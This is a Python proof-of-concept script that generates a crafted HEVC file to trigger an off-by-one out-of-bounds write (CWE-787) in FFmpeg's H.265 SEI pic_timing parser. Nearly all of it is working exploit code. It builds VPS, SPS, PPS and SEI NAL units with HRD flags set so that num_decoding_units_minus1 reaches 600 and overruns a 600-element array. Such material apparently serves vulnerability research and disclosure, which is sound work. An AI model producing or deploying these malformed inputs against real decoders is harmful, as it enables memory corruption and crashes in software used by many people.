#!/usr/bin/env python3
"""
PoC for Off-by-one OOB Write in FFmpeg HEVC CBS SEI pic_timing parsing.

Root cause: in cbs_h265_syntax_template.c FUNC(sei_pic_timing)(), when
  num_decoding_units_minus1 == HEVC_MAX_SLICE_SEGMENTS (600), the loop
  `for (i = 0; i <= current->num_decoding_units_minus1; i++)` writes to
  num_nalus_in_du_minus1[600], which is one past the end of the 600-element
  array (indices 0..599). CWE-787 Out-of-bounds Write.

Trigger: crafted HEVC bitstream with:
  - SPS VUI HRD: sub_pic_hrd_params_present_flag=1,
                 sub_pic_cpb_params_in_pic_timing_sei_flag=1,
                 nal_hrd_parameters_present_flag=1
  - SEI prefix NAL with pic_timing containing num_decoding_units_minus1=600

NAL unit order: VPS -> SPS -> PPS -> SEI_PREFIX
The PPS parse sets h265->active_sps, which is required for SEI pic_timing.
"""

import struct
import sys
import os

# ---------------------------------------------------------------------------
# Bit writer
# ---------------------------------------------------------------------------

class BitWriter:
    def __init__(self):
        self._bits = []

    def write_bit(self, b):
        self._bits.append(b & 1)

    def write_bits(self, value, n):
        """Write n bits of value, MSB first."""
        for i in range(n - 1, -1, -1):
            self._bits.append((value >> i) & 1)

    def write_ue(self, value):
        """Unsigned Exp-Golomb."""
        if value == 0:
            self._bits.append(1)
            return
        x = value + 1
        length = x.bit_length()          # number of bits in x
        for _ in range(length - 1):      # leading zeros
            self._bits.append(0)
        for i in range(length - 1, -1, -1):   # x itself (MSB first)
            self._bits.append((x >> i) & 1)

    def write_se(self, value):
        """Signed Exp-Golomb."""
        if value > 0:
            self.write_ue(2 * value - 1)
        else:
            self.write_ue(-2 * value)

    def write_rbsp_trailing(self):
        """Append stop bit (1) then zeros to reach byte boundary."""
        self._bits.append(1)
        while len(self._bits) % 8 != 0:
            self._bits.append(0)

    def to_bytes(self):
        bits = list(self._bits)
        # Pad to byte boundary (should already be done by write_rbsp_trailing)
        while len(bits) % 8 != 0:
            bits.append(0)
        result = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            result.append(byte)
        return bytes(result)

    def bit_count(self):
        return len(self._bits)


# ---------------------------------------------------------------------------
# RBSP emulation prevention
# ---------------------------------------------------------------------------

def apply_emulation_prevention(data: bytes) -> bytes:
    """
    Insert 0x03 before 0x00 0x00 0x00, 0x00 0x00 0x01, or 0x00 0x00 0x02
    sequences in the RBSP payload (not in the NAL header).
    """
    result = bytearray()
    zero_count = 0
    for b in data:
        if zero_count == 2 and b in (0x00, 0x01, 0x02, 0x03):
            result.append(0x03)
            zero_count = 0
        result.append(b)
        if b == 0x00:
            zero_count += 1
        else:
            zero_count = 0
    return bytes(result)


# ---------------------------------------------------------------------------
# NAL unit wrapper
# ---------------------------------------------------------------------------

def make_nal(nal_type, rbsp_bytes: bytes) -> bytes:
    """
    Build a NAL unit: start code + NAL header + emulation-prevention payload.

    HEVC NAL header (2 bytes):
      Byte 0: forbidden_zero_bit(1) | nal_unit_type(6) | nuh_layer_id_msb(1)
            = 0 | (nal_type << 1) | 0
      Byte 1: nuh_layer_id_lsb(5) | nuh_temporal_id_plus1(3)
            = 0b00000_001  = 0x01   (layer_id=0, temporal_id=0+1=1)
    """
    header = bytes([nal_type << 1, 0x01])
    # Emulation prevention is applied to everything after the 2-byte NAL header
    payload_with_ep = apply_emulation_prevention(rbsp_bytes)
    return b'\x00\x00\x00\x01' + header + payload_with_ep


# ---------------------------------------------------------------------------
# profile_tier_level (profile_present_flag=1, max_num_sub_layers_minus1=0)
#
# Bit layout (96 bits total):
#   general_profile_space      [2]  = 0
#   general_tier_flag          [1]  = 0
#   general_profile_idc        [5]  = 1  (Main profile)
#   general_profile_compat[32] [32] = 0x40000000 (compat_flag[1]=1)
#   general_progressive_source [1]  = 1
#   general_interlaced_source  [1]  = 0
#   general_non_packed         [1]  = 0
#   general_frame_only         [1]  = 0
#   general_reserved_43bits    [43] = 0  (profile 1, not 2/4-11)
#   general_inbld_flag         [1]  = 0  (profile 1 → inbld present)
#   general_level_idc          [8]  = 30
# ---------------------------------------------------------------------------

def write_profile_tier_level(bw: BitWriter):
    bw.write_bits(0, 2)          # general_profile_space = 0
    bw.write_bit(0)              # general_tier_flag = 0
    bw.write_bits(1, 5)          # general_profile_idc = 1 (Main)
    # general_profile_compatibility_flag[32]
    # compat_flag[1]=1 → 0x40000000 MSB first
    bw.write_bits(0x40000000, 32)
    bw.write_bit(1)              # general_progressive_source_flag = 1
    bw.write_bit(0)              # general_interlaced_source_flag = 0
    bw.write_bit(0)              # general_non_packed_constraint_flag = 0
    bw.write_bit(0)              # general_frame_only_constraint_flag = 0
    # Profile 1: not 4-11, not 2 → 43 reserved zeros
    bw.write_bits(0, 43)
    # Profile 1 compatible → general_inbld_flag (1 bit)
    bw.write_bit(0)              # general_inbld_flag = 0
    bw.write_bits(30, 8)         # general_level_idc = 30 (Level 1)
    # max_num_sub_layers_minus1=0: no sub_layer_profile/level present loops


# ---------------------------------------------------------------------------
# HRD sub_layer_hrd_parameters
# (cpb_cnt_minus1=0, sub_pic_hrd_params_present_flag=1)
# ---------------------------------------------------------------------------

def write_sub_layer_hrd_parameters(bw: BitWriter):
    bw.write_ue(0)   # bit_rate_value_minus1[0]
    bw.write_ue(0)   # cpb_size_value_minus1[0]
    bw.write_ue(0)   # cpb_size_du_value_minus1[0]  (sub_pic present)
    bw.write_ue(0)   # bit_rate_du_value_minus1[0]  (sub_pic present)
    bw.write_bit(0)  # cbr_flag[0]


# ---------------------------------------------------------------------------
# HRD parameters (common_inf_present=1, max_num_sub_layers_minus1=0)
#
# We set:
#   nal_hrd_parameters_present_flag          = 1
#   vcl_hrd_parameters_present_flag          = 0
#   sub_pic_hrd_params_present_flag          = 1
#   tick_divisor_minus2                      = 0    (8 bits)
#   du_cpb_removal_delay_increment_length    = 15   (5 bits) → 16 bits per field
#   sub_pic_cpb_params_in_pic_timing_sei_flag= 1    ← KEY TRIGGER FLAG
#   dpb_output_delay_du_length_minus1        = 0    (5 bits) → 1 bit field
#   bit_rate_scale                           = 0    (4 bits)
#   cpb_size_scale                           = 0    (4 bits)
#   cpb_size_du_scale                        = 0    (4 bits, only if sub_pic)
#   initial_cpb_removal_delay_length_minus1  = 0    (5 bits)
#   au_cpb_removal_delay_length_minus1       = 0    (5 bits) → 1 bit field in SEI
#   dpb_output_delay_length_minus1           = 0    (5 bits) → 1 bit field in SEI
# Sub-layer 0:
#   fixed_pic_rate_general_flag[0]           = 0
#   fixed_pic_rate_within_cvs_flag[0]        = 0  (only if !general)
#   low_delay_hrd_flag[0]                    = 1  (cpb_cnt_minus1=0 inferred)
#   sub_layer_hrd_parameters (nal, cpb_cnt=0, sub_pic=1)
# ---------------------------------------------------------------------------

def write_hrd_parameters(bw: BitWriter):
    # common_inf_present = 1: read nal/vcl flags
    bw.write_bit(1)   # nal_hrd_parameters_present_flag = 1
    bw.write_bit(0)   # vcl_hrd_parameters_present_flag = 0

    # nal || vcl = true → read sub_pic block
    bw.write_bit(1)   # sub_pic_hrd_params_present_flag = 1
    bw.write_bits(0, 8)   # tick_divisor_minus2 = 0
    bw.write_bits(15, 5)  # du_cpb_removal_delay_increment_length_minus1 = 15
    bw.write_bit(1)       # sub_pic_cpb_params_in_pic_timing_sei_flag = 1  ← KEY
    bw.write_bits(0, 5)   # dpb_output_delay_du_length_minus1 = 0

    bw.write_bits(0, 4)   # bit_rate_scale = 0
    bw.write_bits(0, 4)   # cpb_size_scale = 0
    bw.write_bits(0, 4)   # cpb_size_du_scale = 0 (only because sub_pic=1)
    bw.write_bits(0, 5)   # initial_cpb_removal_delay_length_minus1 = 0
    bw.write_bits(0, 5)   # au_cpb_removal_delay_length_minus1 = 0
    bw.write_bits(0, 5)   # dpb_output_delay_length_minus1 = 0

    # max_num_sub_layers_minus1=0 → one iteration (i=0)
    bw.write_bit(0)   # fixed_pic_rate_general_flag[0] = 0
    bw.write_bit(0)   # fixed_pic_rate_within_cvs_flag[0] = 0 (since !general)
    bw.write_bit(1)   # low_delay_hrd_flag[0] = 1 (cpb_cnt inferred 0)
    # nal_hrd_parameters_present_flag=1 → sub_layer_hrd_parameters
    write_sub_layer_hrd_parameters(bw)
    # vcl_hrd_parameters_present_flag=0 → skip


# ---------------------------------------------------------------------------
# Build VPS RBSP
# ---------------------------------------------------------------------------

def build_vps() -> bytes:
    bw = BitWriter()
    # NAL header is prepended by make_nal(); we write only RBSP bits here.
    # But the NAL header is NOT part of RBSP, so we start with the VPS fields.

    bw.write_bits(0, 4)   # vps_video_parameter_set_id = 0
    bw.write_bit(1)       # vps_base_layer_internal_flag = 1
    bw.write_bit(1)       # vps_base_layer_available_flag = 1
    bw.write_bits(0, 6)   # vps_max_layers_minus1 = 0
    bw.write_bits(0, 3)   # vps_max_sub_layers_minus1 = 0
    bw.write_bit(1)       # vps_temporal_id_nesting_flag = 1 (required when max_sub_layers=0)
    bw.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits

    write_profile_tier_level(bw)

    bw.write_bit(0)       # vps_sub_layer_ordering_info_present_flag = 0
    # Loop runs for i = 0 (since not info_present and max_sub=0):
    bw.write_ue(1)        # vps_max_dec_pic_buffering_minus1[0] = 1
    bw.write_ue(0)        # vps_max_num_reorder_pics[0] = 0
    bw.write_ue(0)        # vps_max_latency_increase_plus1[0] = 0

    bw.write_bits(0, 6)   # vps_max_layer_id = 0
    bw.write_ue(0)        # vps_num_layer_sets_minus1 = 0
    # Loop from i=1 to 0: empty
    # layer_id_included_flag[0][0] is inferred

    bw.write_bit(0)       # vps_timing_info_present_flag = 0
    bw.write_bit(0)       # vps_extension_flag = 0
    bw.write_rbsp_trailing()
    return bw.to_bytes()


# ---------------------------------------------------------------------------
# Build SPS RBSP
# ---------------------------------------------------------------------------

def build_sps() -> bytes:
    bw = BitWriter()

    bw.write_bits(0, 4)   # sps_video_parameter_set_id = 0
    bw.write_bits(0, 3)   # sps_max_sub_layers_minus1 = 0
    bw.write_bit(1)       # sps_temporal_id_nesting_flag = 1 (required when max_sub=0)

    write_profile_tier_level(bw)

    bw.write_ue(0)        # sps_seq_parameter_set_id = 0
    bw.write_ue(1)        # chroma_format_idc = 1 (4:2:0)
    # separate_colour_plane_flag inferred 0 (chroma != 3)

    # pic_width_in_luma_samples = 64
    # MinCbSizeY = 8 (from log2_min=0 → 3 → 2^3=8)
    # 64 is divisible by 8 ✓
    bw.write_ue(64)       # pic_width_in_luma_samples = 64
    bw.write_ue(64)       # pic_height_in_luma_samples = 64

    bw.write_bit(0)       # conformance_window_flag = 0

    bw.write_ue(0)        # bit_depth_luma_minus8 = 0  (8-bit)
    bw.write_ue(0)        # bit_depth_chroma_minus8 = 0

    bw.write_ue(4)        # log2_max_pic_order_cnt_lsb_minus4 = 4

    bw.write_bit(0)       # sps_sub_layer_ordering_info_present_flag = 0
    # Loop: i = sps_max_sub_layers_minus1 = 0 (just one iteration)
    bw.write_ue(1)        # sps_max_dec_pic_buffering_minus1[0] = 1
    bw.write_ue(0)        # sps_max_num_reorder_pics[0] = 0
    bw.write_ue(0)        # sps_max_latency_increase_plus1[0] = 0

    # min_cb_log2_size_y = 0 + 3 = 3 → MinCbSizeY = 8
    bw.write_ue(0)        # log2_min_luma_coding_block_size_minus3 = 0
    # ctb_log2_size_y = 3 + 3 = 6 → CtbSizeY = 64
    bw.write_ue(3)        # log2_diff_max_min_luma_coding_block_size = 3

    # min_tb_log2_size_y = 0 + 2 = 2
    # Range: 0 <= x <= min_cb_log2_size_y - 2 = 3 - 2 = 1 → use 0
    bw.write_ue(0)        # log2_min_luma_transform_block_size_minus2 = 0
    # Range: 0 <= x <= min(ctb=6,5) - min_tb=2 = 3
    bw.write_ue(3)        # log2_diff_max_min_luma_transform_block_size = 3

    # Range: 0 <= x <= ctb - min_tb = 6 - 2 = 4
    bw.write_ue(0)        # max_transform_hierarchy_depth_inter = 0
    bw.write_ue(0)        # max_transform_hierarchy_depth_intra = 0

    bw.write_bit(0)       # scaling_list_enabled_flag = 0
    bw.write_bit(0)       # amp_enabled_flag = 0
    bw.write_bit(0)       # sample_adaptive_offset_enabled_flag = 0
    bw.write_bit(0)       # pcm_enabled_flag = 0

    bw.write_ue(0)        # num_short_term_ref_pic_sets = 0
    bw.write_bit(0)       # long_term_ref_pics_present_flag = 0
    bw.write_bit(0)       # sps_temporal_mvp_enabled_flag = 0
    bw.write_bit(0)       # strong_intra_smoothing_enabled_flag = 0

    bw.write_bit(1)       # vui_parameters_present_flag = 1
    # --- VUI parameters ---
    bw.write_bit(0)       # aspect_ratio_info_present_flag = 0
    bw.write_bit(0)       # overscan_info_present_flag = 0
    bw.write_bit(0)       # video_signal_type_present_flag = 0
    bw.write_bit(0)       # chroma_loc_info_present_flag = 0
    bw.write_bit(0)       # neutral_chroma_indication_flag = 0
    bw.write_bit(0)       # field_seq_flag = 0
    bw.write_bit(0)       # frame_field_info_present_flag = 0 (affects SEI pic_timing)
    bw.write_bit(0)       # default_display_window_flag = 0

    bw.write_bit(1)       # vui_timing_info_present_flag = 1
    bw.write_bits(1, 32)  # vui_num_units_in_tick = 1
    bw.write_bits(30, 32) # vui_time_scale = 30
    bw.write_bit(0)       # vui_poc_proportional_to_timing_flag = 0

    bw.write_bit(1)       # vui_hrd_parameters_present_flag = 1
    # hrd_parameters(commonInfPresent=1, max_num_sub_layers_minus1=0)
    write_hrd_parameters(bw)

    bw.write_bit(0)       # bitstream_restriction_flag = 0
    # --- end VUI ---

    bw.write_bit(0)       # sps_extension_present_flag = 0

    bw.write_rbsp_trailing()
    return bw.to_bytes()


# ---------------------------------------------------------------------------
# Build PPS RBSP
# The PPS parse sets h265->active_sps, required before SEI pic_timing.
# ---------------------------------------------------------------------------

def build_pps() -> bytes:
    bw = BitWriter()

    bw.write_ue(0)        # pps_pic_parameter_set_id = 0
    bw.write_ue(0)        # pps_seq_parameter_set_id = 0 (references SPS 0)

    bw.write_bit(0)       # dependent_slice_segments_enabled_flag = 0
    bw.write_bit(0)       # output_flag_present_flag = 0
    bw.write_bits(0, 3)   # num_extra_slice_header_bits = 0
    bw.write_bit(0)       # sign_data_hiding_enabled_flag = 0
    bw.write_bit(0)       # cabac_init_present_flag = 0

    bw.write_ue(0)        # num_ref_idx_l0_default_active_minus1 = 0
    bw.write_ue(0)        # num_ref_idx_l1_default_active_minus1 = 0
    bw.write_se(0)        # init_qp_minus26 = 0

    bw.write_bit(0)       # constrained_intra_pred_flag = 0
    bw.write_bit(0)       # transform_skip_enabled_flag = 0
    bw.write_bit(0)       # cu_qp_delta_enabled_flag = 0
    # diff_cu_qp_delta_depth NOT present (cu_qp_delta_enabled_flag=0)
    bw.write_se(0)        # pps_cb_qp_offset = 0
    bw.write_se(0)        # pps_cr_qp_offset = 0
    bw.write_bit(0)       # pps_slice_chroma_qp_offsets_present_flag = 0
    bw.write_bit(0)       # weighted_pred_flag = 0
    bw.write_bit(0)       # weighted_bipred_flag = 0
    bw.write_bit(0)       # transquant_bypass_enabled_flag = 0
    bw.write_bit(0)       # tiles_enabled_flag = 0
    bw.write_bit(0)       # entropy_coding_sync_enabled_flag = 0
    # (no tiles or entropy sync, so no related fields)
    bw.write_bit(1)       # loop_filter_across_slices_enabled_flag = 1
    bw.write_bit(1)       # deblocking_filter_control_present_flag = 1
    bw.write_bit(0)       # deblocking_filter_override_enabled_flag = 0
    bw.write_bit(0)       # pps_deblocking_filter_disabled_flag = 0
    bw.write_se(0)        # pps_beta_offset_div2 = 0
    bw.write_se(0)        # pps_tc_offset_div2 = 0
    bw.write_bit(0)       # pps_scaling_list_data_present_flag = 0
    bw.write_bit(0)       # lists_modification_present_flag = 0
    bw.write_ue(0)        # log2_parallel_merge_level_minus2 = 0
    bw.write_bit(0)       # slice_segment_header_extension_present_flag = 0
    bw.write_bit(0)       # pps_extension_present_flag = 0

    bw.write_rbsp_trailing()
    return bw.to_bytes()


# ---------------------------------------------------------------------------
# Build SEI prefix NAL RBSP (pic_timing with num_decoding_units_minus1=600)
#
# SEI message format (HEVC):
#   while (show_bits(8) == 0xff) { read 0xff; type += 255 }
#   read last_type_byte (0..254)
#   while (show_bits(8) == 0xff) { read 0xff; size += 255 }
#   read last_size_byte (0..254)
#   <payload bytes>
#
# pic_timing (type=1) payload with our HRD config:
#   au_cpb_removal_delay_minus1       : u(1) = 0          → 1 bit
#   pic_dpb_output_delay              : u(1) = 0          → 1 bit
#   pic_dpb_output_du_delay           : u(1) = 0          → 1 bit
#   num_decoding_units_minus1         : ue(600)            → 19 bits
#   du_common_cpb_removal_delay_flag  : 1 bit = 1
#   du_common_cpb_removal_delay_increment_minus1: u(16) = 0 → 16 bits
#   for i in 0..600:
#       num_nalus_in_du_minus1[i]     : ue(0) = 1 bit
#
# Total payload bits = 1+1+1+19+1+16+601 = 640 bits = 80 bytes exactly
# payload_size = 80 (0x50)
# ---------------------------------------------------------------------------

def build_sei_pic_timing_payload() -> bytes:
    bw = BitWriter()

    # frame_field_info_present_flag = 0 → no pic_struct / source_scan_type

    # hrd && (nal || vcl) = true:
    # au_cpb_removal_delay_minus1: u(au_cpb_removal_delay_length_minus1+1) = u(0+1) = u(1)
    bw.write_bits(0, 1)   # au_cpb_removal_delay_minus1 (1 bit)
    # pic_dpb_output_delay: u(dpb_output_delay_length_minus1+1) = u(0+1) = u(1)
    bw.write_bits(0, 1)   # pic_dpb_output_delay (1 bit)
    # sub_pic_hrd_params_present_flag=1 → pic_dpb_output_du_delay:
    # u(dpb_output_delay_du_length_minus1+1) = u(0+1) = u(1)
    bw.write_bits(0, 1)   # pic_dpb_output_du_delay (1 bit)

    # sub_pic_hrd && sub_pic_cpb_params_in_pic_timing_sei_flag=1:
    # num_decoding_units_minus1 = 600 (HEVC_MAX_SLICE_SEGMENTS, triggers OOB)
    bw.write_ue(600)      # num_decoding_units_minus1 = 600 ← OOB trigger

    bw.write_bit(1)       # du_common_cpb_removal_delay_flag = 1
    # du_common_cpb_removal_delay_increment_minus1: u(16) = 0
    bw.write_bits(0, 16)  # du_common_cpb_removal_delay_increment_minus1

    # Loop: for i = 0 to 600 (inclusive) = 601 iterations
    # num_nalus_in_du_minus1[i] = ue(0) = "1" (1 bit each)
    # du_cpb_removal_delay not written when du_common_cpb_removal_delay_flag=1
    for i in range(601):
        bw.write_ue(0)    # num_nalus_in_du_minus1[i] ← writes index 600 OOB!

    payload_bytes = bw.to_bytes()
    assert len(payload_bytes) == 80, f"Expected 80 bytes, got {len(payload_bytes)}"
    assert bw.bit_count() == 640, f"Expected 640 bits, got {bw.bit_count()}"
    return payload_bytes


def build_sei_prefix() -> bytes:
    """Build the SEI prefix NAL RBSP."""
    payload = build_sei_pic_timing_payload()
    payload_size = len(payload)  # 80

    bw = BitWriter()

    # SEI message type: pic_timing = 1
    # Encoded as: last_payload_type_byte (no leading 0xFF since type < 255)
    # We write raw bytes here as the SEI message header parsing reads whole bytes
    # We'll build this as raw bytes

    # Build raw RBSP content:
    # SEI message: type byte | size byte | payload bytes
    # then RBSP trailing bits
    sei_rbsp = bytearray()
    sei_rbsp.append(1)                    # last_payload_type_byte = 1 (pic_timing)
    sei_rbsp.append(payload_size & 0xFF)  # last_payload_size_byte = 80 = 0x50
    sei_rbsp.extend(payload)              # payload bytes
    sei_rbsp.append(0x80)                 # RBSP trailing bits: 10000000

    return bytes(sei_rbsp)


# ---------------------------------------------------------------------------
# Main: assemble the bitstream
# ---------------------------------------------------------------------------

def main():
    out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            'vuln_001_input.hevc')

    vps_rbsp = build_vps()
    sps_rbsp = build_sps()
    pps_rbsp = build_pps()
    sei_rbsp = build_sei_prefix()

    # Minimal IDR slice NAL unit stub.
    # We only need the HEVC parser/demuxer to see this as a picture start so
    # it produces a packet containing the SEI.  The CBS BSF processes each
    # packet through the CBS layer; without a picture NAL the demuxer never
    # produces packets and the SEI is only seen as part of extradata.
    #
    # For CBS slice parsing: first_slice_segment_in_pic_flag=1 (bit 7 of
    # first payload byte), no_output_of_prior_pics_flag=0 (bit 6), then the
    # rest are zeros.  CBS will try to parse the full slice header but will
    # stop when it runs out of bits — the important part is that it processes
    # the preceding SEI NAL first.
    #
    # NAL type 19 = IDR_W_RADL
    # IDR payload bits (MSB first):
    #   bit 0: first_slice_segment_in_pic_flag = 1
    #   bit 1: no_output_of_prior_pics_flag = 0  (IS_IRAP → always present)
    #   bit 2: pps_id = ue(0) = "1"  → so bit 2 must be '1'
    #   bits 3-7: don't matter (parser stops after getting PPS→SPS for dims)
    # Binary: 1 0 1 0 0000 = 0xA0
    IDR_NAL_BODY = bytes([0xA0, 0x00])   # first_slice=1, no_output=0, pps_id=ue(0)=0

    # AUD (Access Unit Delimiter, type 35) to trigger the end of the first
    # access unit and force the demuxer to produce a packet containing
    # the SEI+IDR of the first access unit.
    # The AUD signals the start of the NEXT access unit; the HEVC parser
    # uses this to determine where to split the stream into packets.
    AUD_NAL_BODY = bytes([0x10])  # pic_type ue(0) + RBSP trailing

    # HEVC NAL unit types (decimal)
    VPS_TYPE = 32   # 0x20
    SPS_TYPE = 33   # 0x21
    PPS_TYPE = 34   # 0x22
    SEI_PREFIX_TYPE = 39  # 0x27
    IDR_W_RADL_TYPE = 19  # 0x13
    AUD_TYPE = 35         # 0x23

    bitstream = bytearray()
    # Parameter sets → will become extradata via demuxer
    bitstream.extend(make_nal(VPS_TYPE, vps_rbsp))
    bitstream.extend(make_nal(SPS_TYPE, sps_rbsp))
    bitstream.extend(make_nal(PPS_TYPE, pps_rbsp))
    # First access unit: SEI + IDR stub
    # (CBS BSF will process both when this becomes a packet)
    bitstream.extend(make_nal(SEI_PREFIX_TYPE, sei_rbsp))
    bitstream.extend(make_nal(IDR_W_RADL_TYPE, IDR_NAL_BODY))
    # AUD signals start of next AU → parser flushes first AU as a packet
    bitstream.extend(make_nal(AUD_TYPE, AUD_NAL_BODY))

    with open(out_path, 'wb') as f:
        f.write(bitstream)

    print(f"[+] Written {len(bitstream)} bytes to {out_path}")
    print(f"    VPS RBSP:  {len(vps_rbsp)} bytes")
    print(f"    SPS RBSP:  {len(sps_rbsp)} bytes")
    print(f"    PPS RBSP:  {len(pps_rbsp)} bytes")
    print(f"    SEI RBSP:  {len(sei_rbsp)} bytes  (payload=80 bytes, 601 DU entries)")
    print(f"    IDR stub:  {len(IDR_NAL_BODY)} bytes  (picture NAL to trigger packet)")
    print(f"    AUD stub:  {len(AUD_NAL_BODY)} bytes  (flushes previous packet)")
    print(f"[+] SEI pic_timing: num_decoding_units_minus1=600")
    print(f"    Loop writes num_nalus_in_du_minus1[0..600] (601 elements)")
    print(f"    Array bound: HEVC_MAX_SLICE_SEGMENTS=600 (indices 0..599)")
    print(f"    OOB write at index 600 (1 past end of array)")


if __name__ == '__main__':
    main()
